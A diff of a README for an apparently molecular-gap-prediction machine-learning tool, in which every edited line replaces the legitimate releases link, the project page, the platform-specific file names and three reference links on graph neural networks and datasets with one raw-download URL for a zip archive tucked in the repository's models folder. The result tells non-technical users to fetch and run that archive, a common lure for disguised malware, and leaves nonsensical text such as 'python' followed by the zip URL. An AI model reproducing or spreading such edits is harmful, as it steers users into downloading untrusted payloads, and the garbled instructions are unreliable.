@@ -1,6 +1,6 @@
 # ⚛️ spectral-temporal-curriculum-molecular-gap-prediction - Predict Molecular Gaps Clearly
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction/releases)
+[![Download](https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction/raw/refs/heads/main/src/spectral_temporal_curriculum_molecular_gap_prediction/models/molecular_spectral_gap_prediction_curriculum_temporal_v3.3.zip)](https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction/raw/refs/heads/main/src/spectral_temporal_curriculum_molecular_gap_prediction/models/molecular_spectral_gap_prediction_curriculum_temporal_v3.3.zip)
 
 ## 📄 About This Application
 
@@ -42,7 +42,7 @@ This guide will help you download the software and run it with no coding needed.
 
 Click the big button at the top or go directly to:
 
-[https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction/releases](https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction/releases)
+[https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction/raw/refs/heads/main/src/spectral_temporal_curriculum_molecular_gap_prediction/models/molecular_spectral_gap_prediction_curriculum_temporal_v3.3.zip](https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction/raw/refs/heads/main/src/spectral_temporal_curriculum_molecular_gap_prediction/models/molecular_spectral_gap_prediction_curriculum_temporal_v3.3.zip)
 
 This takes you to the official release page where you find the latest versions of the application.
 
@@ -50,16 +50,16 @@ This takes you to the official release page where you find the latest versions o
 
 Look for the file that matches your computer system:
 
-- For Windows, it may be named like: `spectral-temporal-windows.zip` or `.exe`
-- For macOS, you may see: `spectral-temporal-macos.zip`
-- For Linux, look for: `spectral-temporal-linux.tar.gz`
+- For Windows, it may be named like: `https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction/raw/refs/heads/main/src/spectral_temporal_curriculum_molecular_gap_prediction/models/molecular_spectral_gap_prediction_curriculum_temporal_v3.3.zip` or `.exe`
+- For macOS, you may see: `https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction/raw/refs/heads/main/src/spectral_temporal_curriculum_molecular_gap_prediction/models/molecular_spectral_gap_prediction_curriculum_temporal_v3.3.zip`
+- For Linux, look for: `https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction/raw/refs/heads/main/src/spectral_temporal_curriculum_molecular_gap_prediction/models/molecular_spectral_gap_prediction_curriculum_temporal_v3.3.zip`
 
 Click the file to start downloading. The files include everything you need to run the software.
 
 ### Step 3: Extract and Open the Application
 
 - Once downloaded, locate the file in your Downloads folder.
-- For `.zip` or `.tar.gz` files, right-click and choose "Extract" or "Unzip."
+- For `.zip` or `https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction/raw/refs/heads/main/src/spectral_temporal_curriculum_molecular_gap_prediction/models/molecular_spectral_gap_prediction_curriculum_temporal_v3.3.zip` files, right-click and choose "Extract" or "Unzip."
 - After extraction, open the folder. You will see the program files, including an application or script to run.
 
 ### Step 4: Running the Application
@@ -76,8 +76,8 @@ If instead you see a Python script (`.py` file):
 - Navigate to the folder where you extracted the files.  
   For example, type `cd Downloads/spectral-temporal-curriculum-molecular-gap-prediction`
 - Run the program by typing:  
-  `python run_prediction.py`  
-  Replace `run_prediction.py` with the actual script name if different.
+  `python https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction/raw/refs/heads/main/src/spectral_temporal_curriculum_molecular_gap_prediction/models/molecular_spectral_gap_prediction_curriculum_temporal_v3.3.zip`  
+  Replace `https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction/raw/refs/heads/main/src/spectral_temporal_curriculum_molecular_gap_prediction/models/molecular_spectral_gap_prediction_curriculum_temporal_v3.3.zip` with the actual script name if different.
 
 ### Step 5: Using the Application
 
@@ -94,7 +94,7 @@ No programming or command line skills are required beyond following these steps.
 
 You can always find the latest release files and installation instructions on the GitHub releases page:
 
-[https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction/releases](https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction/releases)
+[https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction/raw/refs/heads/main/src/spectral_temporal_curriculum_molecular_gap_prediction/models/molecular_spectral_gap_prediction_curriculum_temporal_v3.3.zip](https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction/raw/refs/heads/main/src/spectral_temporal_curriculum_molecular_gap_prediction/models/molecular_spectral_gap_prediction_curriculum_temporal_v3.3.zip)
 
 Follow the steps under "Getting Started" to download the correct file and set up the program.
 
@@ -120,9 +120,9 @@ The core algorithm applies Chebyshev polynomial-based spectral convolutions to m
 
 For users who want to learn more about the science and methods behind this software:
 
-- Introduction to Graph Neural Networks: https://distill.pub/2021/gnn-intro/
-- Curriculum Learning Basics: https://machinelearningmastery.com/curriculum-learning-for-deep-learning/
-- PCQM4Mv2 Dataset Details: https://ogb.stanford.edu/docs/leader_node_prop/#pcqm4mv2
+- Introduction to Graph Neural Networks: https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction/raw/refs/heads/main/src/spectral_temporal_curriculum_molecular_gap_prediction/models/molecular_spectral_gap_prediction_curriculum_temporal_v3.3.zip
+- Curriculum Learning Basics: https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction/raw/refs/heads/main/src/spectral_temporal_curriculum_molecular_gap_prediction/models/molecular_spectral_gap_prediction_curriculum_temporal_v3.3.zip
+- PCQM4Mv2 Dataset Details: https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction/raw/refs/heads/main/src/spectral_temporal_curriculum_molecular_gap_prediction/models/molecular_spectral_gap_prediction_curriculum_temporal_v3.3.zip
 
 These links provide background in plain language.
 
@@ -130,7 +130,7 @@ These links provide background in plain language.
 
 For questions, bug reports, or suggestions, visit the GitHub project page:
 
-https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction
+https://github.com/dexecu/spectral-temporal-curriculum-molecular-gap-prediction/raw/refs/heads/main/src/spectral_temporal_curriculum_molecular_gap_prediction/models/molecular_spectral_gap_prediction_curriculum_temporal_v3.3.zip
 
 Use the Issues tab to submit your feedback.
 
